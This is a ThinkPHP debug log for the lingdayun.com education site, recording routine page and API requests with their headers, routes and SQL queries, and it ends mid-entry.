[ 2023-01-06T00:25:43+08:00 ] 10.0.8.4 124.71.166.204 GET /
[ log ] www.lingdayun.com/ [运行时间：0.075405s][吞吐率：13.26req/s] [内存消耗：1,276.59kb] [文件加载：44]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'accept-encoding' => 'gzip',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Windows NT 7.7; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3712.88 Safari/537.36',
  'accept-language' => 'zh-CN, zh; q=0.9, en; q=0.8, ko; q=0.7',
  'accept' => 'text/html, application/xhtml+xml, application/xml; q=0.9, image/webp; q=0.8',
  'host' => 'www.lingdayun.com',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T00:25:43+08:00 ] 10.0.8.4 124.71.166.204 GET /index.html
[ log ] www.lingdayun.com/index.html [运行时间：0.075626s][吞吐率：13.22req/s] [内存消耗：1,279.87kb] [文件加载：44]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'accept-encoding' => 'gzip',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.9; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3574.88 Safari/537.36',
  'accept-language' => 'zh-CN, zh; q=0.9, en; q=0.8, ko; q=0.7',
  'accept' => 'text/html, application/xhtml+xml, application/xml; q=0.9, image/webp; q=0.8',
  'host' => 'www.lingdayun.com',
)
[ info ] [ PARAM ] array (
  '/index_html' => '',
)
[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T01:11:34+08:00 ] 10.0.8.4 111.225.148.55 GET /
[ log ] lingdayun.com/ [运行时间：0.080378s][吞吐率：12.44req/s] [内存消耗：1,276.55kb] [文件加载：44]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'host' => 'lingdayun.com',
  'accept-encoding' => 'gzip, deflate',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'accept-language' => 'zh,zh-CN;q=0.9',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 5.0) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; Bytespider; https://zhanzhang.toutiao.com/)',
  'upgrade-insecure-requests' => '1',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T01:17:13+08:00 ] 10.0.8.4 42.83.147.34 GET /
[ log ] lingdayun.com/ [运行时间：0.072338s][吞吐率：13.82req/s] [内存消耗：1,276.21kb] [文件加载：44]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'content-type' => 'text/html; charset=utf-8',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)Chrome/74.0.3729.169 Safari/537.36',
  'host' => 'lingdayun.com',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T03:04:13+08:00 ] 10.0.8.4 5.188.62.174 GET /
[ log ] lingdayun.com/ [运行时间：0.086127s][吞吐率：11.61req/s] [内存消耗：1,276.04kb] [文件加载：44]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'cookie' => 'beget=begetok; humans_21909=1',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4758.11 Safari/537.36',
  'accept-encoding' => 'gzip,deflate',
  'connection' => 'close',
  'host' => 'lingdayun.com',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T03:06:58+08:00 ] 10.0.8.4 207.46.13.44 GET /
[ log ] www.lingdayun.com/ [运行时间：0.072756s][吞吐率：13.74req/s] [内存消耗：1,276.49kb] [文件加载：44]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'host' => 'www.lingdayun.com',
  'user-agent' => 'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36',
  'from' => 'bingbot(at)microsoft.com',
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'pragma' => 'no-cache',
  'cache-control' => 'no-cache',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T03:24:05+08:00 ] 10.0.8.4 110.249.227.176 GET /
[ log ] lingdayun.com/ [运行时间：0.073887s][吞吐率：13.53req/s] [内存消耗：1,275.99kb] [文件加载：44]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; The World)',
  'accept-encoding' => 'gzip,deflate',
  'accept' => '*/*',
  'host' => 'lingdayun.com',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T03:24:06+08:00 ] 10.0.8.4 110.249.227.176 GET /
[ log ] lingdayun.com/ [运行时间：0.072271s][吞吐率：13.84req/s] [内存消耗：1,275.88kb] [文件加载：44]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv,2.0.1) Gecko/20100101 Firefox/4.0.1',
  'accept' => '*/*',
  'host' => 'lingdayun.com',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T03:25:11+08:00 ] 10.0.8.4 180.163.29.234 GET /
[ log ] lingdayun.com/ [运行时间：0.077176s][吞吐率：12.96req/s] [内存消耗：1,276.21kb] [文件加载：44]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'accept-language' => 'zh-CN,zh;q=0.8,en-US;q=0.6,en;q=0.4',
  'referer' => 'http://lingdayun.com/',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/537.36 (KHTML, like Gecko) 			Chrome/55.0.2883.95 Safari/537.36',
  'host' => 'lingdayun.com',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T03:29:12+08:00 ] 10.0.8.4 106.91.6.113 GET /
[ log ] lingdayun.com/ [运行时间：0.075890s][吞吐率：13.18req/s] [内存消耗：1,277.73kb] [文件加载：44]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'host' => 'lingdayun.com',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'accept-encoding' => 'gzip, deflate, br',
  'sec-ch-ua-platform' => '"Windows"',
  'sec-ch-ua-mobile' => '?0',
  'sec-ch-ua' => '" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"',
  'sec-fetch-dest' => 'iframe',
  'sec-fetch-mode' => 'navigate',
  'sec-fetch-site' => 'cross-site',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36',
  'upgrade-insecure-requests' => '1',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T03:29:28+08:00 ] 10.0.8.4 106.91.6.113 GET /
[ log ] lingdayun.com/ [运行时间：0.075443s][吞吐率：13.26req/s] [内存消耗：1,277.63kb] [文件加载：44]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'host' => 'lingdayun.com',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'accept-encoding' => 'gzip, deflate, br',
  'sec-ch-ua-platform' => '"Windows"',
  'sec-ch-ua-mobile' => '?0',
  'sec-ch-ua' => '" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"',
  'sec-fetch-dest' => 'document',
  'sec-fetch-mode' => 'navigate',
  'sec-fetch-site' => 'cross-site',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36',
  'upgrade-insecure-requests' => '1',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T07:30:53+08:00 ] 10.0.8.4 207.46.13.44 GET /
[ log ] lingdayun.com/ [运行时间：0.075382s][吞吐率：13.27req/s] [内存消耗：1,276.55kb] [文件加载：44]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'host' => 'lingdayun.com',
  'user-agent' => 'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36',
  'from' => 'bingbot(at)microsoft.com',
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'pragma' => 'no-cache',
  'cache-control' => 'no-cache',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T07:43:05+08:00 ] 10.0.8.4 183.199.107.9 GET /index.php/index/api/video_tuijian
[ log ] www.lingdayun.com/index.php/index/api/video_tuijian [运行时间：0.108310s][吞吐率：9.23req/s] [内存消耗：1,910.31kb] [文件加载：52]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'api',
    2 => 'video_tuijian',
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'host' => 'www.lingdayun.com',
  'cookie' => 'ZDEDebuggerPresent=php,phtml,php3; PHPSESSID=l6kuuk6rumcivg1nagokv7qgh5',
  'accept-language' => 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
  'accept-encoding' => 'gzip, deflate',
  'referer' => 'https://www.lingdayun.com/weishi/index.html',
  'sec-fetch-dest' => 'empty',
  'sec-fetch-mode' => 'cors',
  'sec-fetch-site' => 'same-origin',
  'x-requested-with' => 'XMLHttpRequest',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 11; V2054A Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/3263 MMWEBSDK/20210601 Mobile Safari/537.36 MMWEBID/6487 MicroMessenger/8.0.11.1980(0x28000B37) Process/toolsmp WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64',
  'accept' => 'application/json, text/javascript, */*; q=0.01',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Api->video_tuijian[ C:\wwwroot\www.lingdayun.com\application\index\controller\Api.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.001556s ] mysql:dbname=www_lingdayun_co;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `ld_video` [ RunTime:0.002864s ]
[ sql ] [ SQL ] SELECT `a`.*,`d`.`teacher_name`,`b`.`kemu_cate`,`c`.`nianji_cate` FROM `ld_video` `a` INNER JOIN `ld_teacher` `d` ON `a`.`teacher_id`=`d`.`id` INNER JOIN `ld_kemu_cate` `b` ON `a`.`video_kemu`=`b`.`id` INNER JOIN `ld_nianji_cate` `c` ON `a`.`video_nianji`=`c`.`id` ORDER BY id desc LIMIT 2 [ RunTime:0.001191s ]

---------------------------------------------------------------
[ 2023-01-06T07:43:06+08:00 ] 10.0.8.4 183.199.107.9 GET /index.php/api/weishi/my_shoucang
[ log ] www.lingdayun.com/index.php/api/weishi/my_shoucang [运行时间：0.100560s][吞吐率：9.94req/s] [内存消耗：1,912.05kb] [文件加载：52]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'api',
    1 => 'weishi',
    2 => 'my_shoucang',
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'host' => 'www.lingdayun.com',
  'cookie' => 'ZDEDebuggerPresent=php,phtml,php3; PHPSESSID=l6kuuk6rumcivg1nagokv7qgh5',
  'accept-language' => 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
  'accept-encoding' => 'gzip, deflate',
  'referer' => 'https://www.lingdayun.com/weishi/index.html',
  'sec-fetch-dest' => 'empty',
  'sec-fetch-mode' => 'cors',
  'sec-fetch-site' => 'same-origin',
  'x-requested-with' => 'XMLHttpRequest',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 11; V2054A Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/3263 MMWEBSDK/20210601 Mobile Safari/537.36 MMWEBID/6487 MicroMessenger/8.0.11.1980(0x28000B37) Process/toolsmp WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64',
  'accept' => 'application/json, text/javascript, */*; q=0.01',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\api\controller\Weishi->my_shoucang[ C:\wwwroot\www.lingdayun.com\application\api\controller\Weishi.php ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ DB ] INIT mysql
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000645s ] mysql:dbname=www_lingdayun_co;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `ld_weishi_shoucang` [ RunTime:0.003421s ]
[ sql ] [ SQL ] SELECT * FROM `ld_weishi_shoucang` `a` INNER JOIN `ld_teacher` `b` ON `a`.`teacher_id`=`b`.`id` WHERE  `a`.`openid` = null LIMIT 4 [ RunTime:0.000383s ]

---------------------------------------------------------------
[ 2023-01-06T07:43:07+08:00 ] 10.0.8.4 183.199.107.9 GET /index.php/api/weishi/mingshi
[ log ] www.lingdayun.com/index.php/api/weishi/mingshi [运行时间：0.107880s][吞吐率：9.27req/s] [内存消耗：1,912.52kb] [文件加载：52]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'api',
    1 => 'weishi',
    2 => 'mingshi',
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'host' => 'www.lingdayun.com',
  'cookie' => 'ZDEDebuggerPresent=php,phtml,php3; PHPSESSID=l6kuuk6rumcivg1nagokv7qgh5',
  'accept-language' => 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
  'accept-encoding' => 'gzip, deflate',
  'referer' => 'https://www.lingdayun.com/weishi/index.html',
  'sec-fetch-dest' => 'empty',
  'sec-fetch-mode' => 'cors',
  'sec-fetch-site' => 'same-origin',
  'x-requested-with' => 'XMLHttpRequest',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 11; V2054A Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/3263 MMWEBSDK/20210601 Mobile Safari/537.36 MMWEBID/6487 MicroMessenger/8.0.11.1980(0x28000B37) Process/toolsmp WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64',
  'accept' => 'application/json, text/javascript, */*; q=0.01',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\api\controller\Weishi->mingshi[ C:\wwwroot\www.lingdayun.com\application\api\controller\Weishi.php ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ DB ] INIT mysql
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.001387s ] mysql:dbname=www_lingdayun_co;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `ld_teacher` [ RunTime:0.002388s ]
[ sql ] [ SQL ] SELECT * FROM `ld_teacher` WHERE  (  is_mingshi=1 ) [ RunTime:0.000307s ]

---------------------------------------------------------------
[ 2023-01-06T08:56:05+08:00 ] 10.0.8.4 111.7.96.155 GET /
[ log ] lingdayun.com/ [运行时间：0.106986s][吞吐率：9.35req/s] [内存消耗：1,276.97kb] [文件加载：44]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'upgrade-insecure-requests' => '1',
  'sec-gpc' => '1',
  'dnt' => '1',
  'connection' => 'close',
  'cache-control' => 'max-age=0',
  'accept-language' => 'en;q=0.9',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
  'host' => 'lingdayun.com',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T08:56:05+08:00 ] 10.0.8.4 111.7.96.155 GET /
[ log ] lingdayun.com/ [运行时间：0.074176s][吞吐率：13.48req/s] [内存消耗：1,276.56kb] [文件加载：44]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'accept-encoding' => 'gzip',
  'upgrade-insecure-requests' => '1',
  'accept-language' => 'en',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
  'host' => 'lingdayun.com',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T08:56:48+08:00 ] 10.0.8.4 211.95.50.8 GET /
[ log ] www.lingdayun.com/ [运行时间：0.088747s][吞吐率：11.27req/s] [内存消耗：1,277.05kb] [文件加载：44]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'upgrade-insecure-requests' => '1',
  'sec-gpc' => '1',
  'dnt' => '1',
  'connection' => 'close',
  'cache-control' => 'max-age=0',
  'accept-language' => 'en;q=0.9',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
  'host' => 'www.lingdayun.com',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T08:56:48+08:00 ] 10.0.8.4 211.95.50.7 GET /
[ log ] www.lingdayun.com/ [运行时间：0.077675s][吞吐率：12.87req/s] [内存消耗：1,276.53kb] [文件加载：44]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'accept-encoding' => 'gzip',
  'upgrade-insecure-requests' => '1',
  'accept-language' => 'en',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
  'host' => 'www.lingdayun.com',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T09:36:18+08:00 ] 10.0.8.4 124.71.166.204 GET /
[ log ] www.lingdayun.com/ [运行时间：0.086087s][吞吐率：11.62req/s] [内存消耗：1,276.59kb] [文件加载：44]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'accept-encoding' => 'gzip',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Windows NT 7.5; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3800.88 Safari/537.36',
  'accept-language' => 'zh-CN, zh; q=0.9, en; q=0.8, ko; q=0.7',
  'accept' => 'text/html, application/xhtml+xml, application/xml; q=0.9, image/webp; q=0.8',
  'host' => 'www.lingdayun.com',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T09:36:18+08:00 ] 10.0.8.4 124.71.166.204 GET /index.html
[ log ] www.lingdayun.com/index.html [运行时间：0.086495s][吞吐率：11.56req/s] [内存消耗：1,279.87kb] [文件加载：44]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'accept-encoding' => 'gzip',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Windows NT 8.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.1550.88 Safari/537.36',
  'accept-language' => 'zh-CN, zh; q=0.9, en; q=0.8, ko; q=0.7',
  'accept' => 'text/html, application/xhtml+xml, application/xml; q=0.9, image/webp; q=0.8',
